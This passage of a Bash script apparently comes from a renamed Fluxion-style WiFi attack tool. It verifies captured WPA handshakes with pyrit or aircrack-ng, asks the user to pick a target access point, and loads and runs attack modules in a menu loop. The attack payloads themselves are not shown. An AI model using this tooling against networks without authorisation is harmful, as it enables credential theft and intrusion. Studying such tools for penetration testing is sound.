function keyfly_check_hash() {
	if [ ! -f "$APTargetHashPath" -o ! -s "$APTargetHashPath" ]; then
		echo -e "$KEYFLYVLine $KEYFLYHashFileDoesNotExistError"
		sleep 3
		return 1;
	fi

	local verifier

	if [ "$KEYFLYAuto" ]; then
		verifier="pyrit"
	else
		keyfly_header

		echo -e "$KEYFLYVLine $KEYFLYHashVerificationMethodQuery"
		echo

		keyfly_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"

		local choices=("$KEYFLYHashVerificationMethodPyritOption" "$KEYFLYHashVerificationMethodAircrackOption" "$KEYFLYGeneralBackOption")
		io_query_choice "" choices[@]

		echo

		case "$IOQueryChoice" in
			"$KEYFLYHashVerificationMethodPyritOption") verifier="pyrit";;
			"$KEYFLYHashVerificationMethodAircrackOption") verifier="aircrack-ng";;
			"$KEYFLYGeneralBackOption") return 1;;
		esac
	fi

	hash_check_handshake "$verifier" "$APTargetHashPath" "$APTargetSSID" "$APTargetMAC" > $KEYFLYOutputDevice
	local hashResult=$?

	# A value other than 0 means there's an issue with the hash.
	if [ $hashResult -ne 0 ]
	then echo -e "$KEYFLYVLine $KEYFLYHashInvalidError"
	else echo -e "$KEYFLYVLine $KEYFLYHashValidNotice"
	fi

	sleep 3

	if [ $hashResult -ne 0 ]; then return 1; fi
}

function keyfly_set_hash_path() {
	keyfly_header
	echo
	echo -e  "$KEYFLYVLine $KEYFLYPathToHandshakeFileQuery"
	echo
	echo -ne "$KEYFLYAbsolutePathInfo: "
	read APTargetHashPath
}

function keyfly_unset_hash() {
	APTargetHashPath=""
}

function keyfly_set_hash() {
	if [ "$APTargetHashPath" ]; then return 0; fi

	keyfly_unset_hash

	# Scan for an existing hash for potential use, if one exists,
	# ask the user if we should use it, or to skip it.
	if [ -f "$KEYFLYHashPath/$APTargetSSIDClean-$APTargetMAC.cap" -a \
		 -s "$KEYFLYHashPath/$APTargetSSIDClean-$APTargetMAC.cap" ]; then

		if [ ! "$KEYFLYAuto" ];then
			keyfly_header

			echo -e "$KEYFLYVLine $KEYFLYFoundHashNotice"
			echo

			keyfly_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"

			printf   "Path: %s\n" "$KEYFLYHashPath/$APTargetSSIDClean-$APTargetMAC.cap"
			echo -ne "$KEYFLYVLine ${CRed}$KEYFLYUseFoundHashQuery$CClr [${CWht}Y$CClr/n] "

			read APTargetHashPathConsidered

			echo
		fi

		if [ "$APTargetHashPathConsidered" = "" -o "$APTargetHashPathConsidered" = "y" -o "$APTargetHashPathConsidered" = "Y" ]; then
			APTargetHashPath="$KEYFLYHashPath/$APTargetSSIDClean-$APTargetMAC.cap"
			keyfly_check_hash
			# If the user decides to go back, we must unset.
			if [ $? -ne 0 ]; then keyfly_unset_hash; return 1; fi
		fi
	fi

	# If the hash was not found, or if it was skipped,
	# ask for location or for gathering one.
	while [ ! -f "$APTargetHashPath" -o ! -s "$APTargetHashPath" ]; do
		keyfly_header

		echo -e "$KEYFLYVLine $KEYFLYHashSourceQuery"
		echo

		keyfly_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"

		local choices=("$KEYFLYHashSourcePathOption" "$KEYFLYHashSourceRescanOption" "$KEYFLYGeneralBackOption")
		io_query_choice "" choices[@]

		echo

		case "$IOQueryChoice" in
			"$KEYFLYHashSourcePathOption") keyfly_set_hash_path; keyfly_check_hash;;
			"$KEYFLYHashSourceRescanOption") keyfly_set_hash;; # Rescan checks hash automatically.
			"$KEYFLYGeneralBackOption" ) keyfly_unset_hash; return 1;;
		esac

		# This conditional is required for return values
		# of operation performed in the case statement.
		if [ $? -ne 0 ]; then keyfly_unset_hash; return 1; fi
	done

	# Copy to workspace for hash-required operations.
	cp "$APTargetHashPath" "$KEYFLYWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap"
}

###################################### < Attack > ######################################
function keyfly_unset_attack() {
	if [ "$KEYFLYAttack" ]
	    then unprep_attack
	fi
	KEYFLYAttack=""
}

# Select the attack strategy to be used.
function keyfly_set_attack() {
	if [ "$KEYFLYAttack" ]; then return 0; fi

	keyfly_unset_attack

	keyfly_header

	echo -e "$KEYFLYVLine $KEYFLYAttackQuery"
	echo

	keyfly_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"

	#local attacksMeta=$(head -n 3 attacks/*/language/$KEYFLYLanguage.sh)

	#local attacksIdentifier
	#readarray -t attacksIdentifier < <("`echo "$attacksMeta" | grep -E "^# identifier: " | sed -E 's/# \w+: //'`")

	#local attacksDescription
	#readarray -t attacksDescription < <("`echo "$attacksMeta" | grep -E "^# description: " | sed -E 's/# \w+: //'`")

	local attacks
	readarray -t attacks < <(ls -1 attacks)

	local descriptions
	readarray -t descriptions < <(head -n 3 attacks/*/language/$KEYFLYLanguage.sh | grep -E "^# description: " | sed -E 's/# \w+: //')

	local identifiers=()

	local attack
	for attack in "${attacks[@]}"; do
		local identifier="`head -n 3 "attacks/$attack/language/$KEYFLYLanguage.sh" | grep -E "^# identifier: " | sed -E 's/# \w+: //'`"
		if [ "$identifier" ]
		then identifiers+=("$identifier")
		else identifiers+=("$attack")
		fi
	done

	attacks+=("$KEYFLYGeneralBackOption")
	identifiers+=("$KEYFLYGeneralBackOption")
	descriptions+=("")

	io_query_format_fields "" "\t$CRed[$CSYel%d$CClr$CRed]$CClr%0.0s $CCyn%b$CClr %b\n" attacks[@] identifiers[@] descriptions[@]

	echo

	if [ "${IOQueryFormatFields[1]}" = "$KEYFLYGeneralBackOption" ]; then
		keyfly_unset_target_ap
		keyfly_unset_attack
		return 1
	fi

	KEYFLYAttack=${IOQueryFormatFields[0]}

	# Load attack and its corresponding language file.
	source "attacks/$KEYFLYAttack/language/$KEYFLYLanguage.sh"
	source "attacks/$KEYFLYAttack/attack.sh"

	prep_attack

	if [ $? -ne 0 ]; then
		keyfly_unset_attack
		return 1
	fi
}

# Attack
function keyfly_run_attack() {
	start_attack

	local choices=("$KEYFLYSelectAnotherAttackOption" "$KEYFLYGeneralExitOption")
	io_query_choice "`io_dynamic_output $KEYFLYAttackInProgressNotice`" choices[@]

	echo

	# IOQueryChoice is a global, meaning, its value is volatile.
	# We need to make sure to save the choice before it changes.
	local choice="$IOQueryChoice"

	stop_attack

	if [ "$choice" = "$KEYFLYGeneralExitOption" ]; then keyfly_handle_exit; fi

	keyfly_unset_attack
}

################################### < KEYFLY Loop > ###################################
keyfly_set_resolution
keyfly_set_language

while true; do
	keyfly_set_interface;	if [ $? -ne 0 ]; then continue; fi
	keyfly_set_scanner;	if [ $? -ne 0 ]; then continue; fi
	keyfly_set_target_ap;	if [ $? -ne 0 ]; then continue; fi
	keyfly_set_attack;		if [ $? -ne 0 ]; then continue; fi
	keyfly_run_attack;		if [ $? -ne 0 ]; then continue; fi
done

# FLUXSCRIPT END
